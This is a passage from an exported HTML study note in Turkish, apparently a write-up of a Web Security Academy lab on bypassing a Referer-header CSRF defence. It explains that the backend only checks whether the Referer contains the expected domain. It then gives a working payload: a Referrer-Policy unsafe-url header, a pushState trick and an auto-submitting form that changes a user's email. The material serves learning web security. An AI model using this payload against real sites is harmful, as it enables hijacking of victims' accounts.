</p><p id="12485ea1-2e5b-4385-81d6-50b1b3b12a10" class="">Referer headerı CSRF ataklarına karşı test edelim ;</p><p id="464b8136-fbc6-4d40-973a-c75df3e8aae7" class="">1.) referer header ı kaldıralım</p><p id="0b22428b-9b52-440a-a2e3-e1b504430218" class="">2.) backend , referer header’ın hangi kısımlarını kontrol ediyor test edelim</p><p id="ba4ab0e3-d14a-4ab0-b82f-f38055d8305b" class="">
</p><p id="46882a9e-6e2e-48e9-99cf-4780aa917d86" class="">
</p><p id="8ddb00c1-45ea-4a13-abd6-fc24242a9777" class="">
</p><p id="fb7043b5-7d5c-4758-ab75-f1b4abbf478b" class="">Bu challenge&#x27;da domain&#x27;in tamamı kontrol edilmiyor ( yani “exact domain does not get checked”   )  , sadece referer header&#x27;da bulunan adres ,  istenen domain&#x27;i içeriyor mu (yani contain ediyor mu )   bunun kontrolü var.By-pass yapılabilir bu.</p><p id="7f2e32e5-70ee-475e-9c6f-8bd8a1ebcbd5" class="">
</p><p id="82a60cc9-161e-41d2-b789-2f6fb7f65a02" class="">
</p><h2 id="88d50aff-c97b-4b7b-8f18-9b55ae423d0b" class="">Bu bağlamdaki payload ;</h2><h3 id="be1268d7-54d5-4922-aab8-0520786b6015" class="">
Head</h3><pre id="eeff97ed-e1ff-46c0-8590-9a59bae1d484" class="code"><code>HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url</code></pre><h3 id="1b7bd7f4-8728-4822-9c05-af9446fb9d8e" class="">
Body</h3><pre id="b977cd5a-1070-4e29-bc69-af989e28b255" class="code"><code>

Head Kısmına eklemeyi unutma ! =&gt;   Referrer-Policy: unsafe-url

&lt;script&gt;
history.pushState(&quot;&quot;, &quot;&quot;, &quot;/?randomnumber.web-security-academy.net&quot;)
&lt;/script&gt;

&lt;form action=&quot;https://randomnumber.web-security-academy.net/my-account/change-email&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;aaaaaaaaaa@aaaaaaaaa&quot; /&gt;
&lt;/form&gt;

&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;
</code></pre><p id="baff7cf5-983b-4b40-9787-abd0091ca52b" class="">
</p><p id="ab8cadc1-8a57-48be-90c5-24620996dbe0" class="">
</p><figure id="0d99d841-a58e-43a0-9149-0392b942d59b" class="image"><a href="CSRF%208e833dbcbe9f47ea95f9968d88de3c46/Screen_Shot_2021-12-05_at_18.41.53.png"><img style="width:1810px" src="CSRF%208e833dbcbe9f47ea95f9968d88de3c46/Screen_Shot_2021-12-05_at_18.41.53.png"/></a></figure><p id="43acc1e2-2936-48e8-82ef-653379e561f1" class="">
</p><p id="08416ad2-12c1-4d03-8908-6d3d9f522039" class="">
</p><p id="faff04bf-503c-4bda-abb9-235f0dd7f701" class="">
</p><p id="8fc4f646-87df-4e0d-9795-6f8a31b67f4f" class="">
</p><p id="5dd0cc47-892b-49e7-a399-4174e0459495" class="">
</p><p id="ffd2b22b-f3c1-4808-80df-c4f45d76ed12" class="">
</p><p id="5950f8ea-c4f4-45e3-94a5-015e74f9483c" class="">
</p><p id="08045a31-1bc9-4880-8917-8045dc118806" class="">
</p><p id="94b935ad-b101-4765-8d36-60b5a48f2176" class="">
</p><p id="3ba266f4-ee8e-43af-9aa2-24d378c5b52f" class="">
</p><p id="3ef124c5-0028-40e2-b234-3df5b0add9b8" class="">
</p><p id="77e2c4f9-755d-47ec-a1c5-247af07e4105" class="">
</p><p id="b50e9919-4670-4e8e-8041-8967b13806a0" class="">
</p><p id="652143e7-bc34-4f83-af15-d708cae4f3de" class="">
</p><p id="d0be7c7e-2638-46b7-839a-f7539a3f6f15" class="">
</p><p id="a3374b6c-118d-4563-b021-4d04654b0329" class="">
</p><p id="a740f5c9-6711-4b0b-814f-9b7a9df0989a" class="">
</p><p id="067ec78d-57b1-4ee1-8c42-5162f81d5435" class="">
</p><p id="8dff5b03-c94e-46a4-a611-c209f5284a9f" class="">
</p><p id="ec3c6bd9-4227-4127-9fd4-519f2f6389c0" class="">
</p><p id="72417f1d-0e44-4d2d-8775-5a1001d9d229" class="">
</p><p id="bedb6e56-ddbd-42db-ba06-5716156d20c4" class="">
</p><p id="a7da0810-c608-444e-b4de-86aa1cbd20cb" class="">
</p><p id="e64e66e6-18c7-46fb-85e1-ef47b266b08d" class="">
</p></div></article></body></html>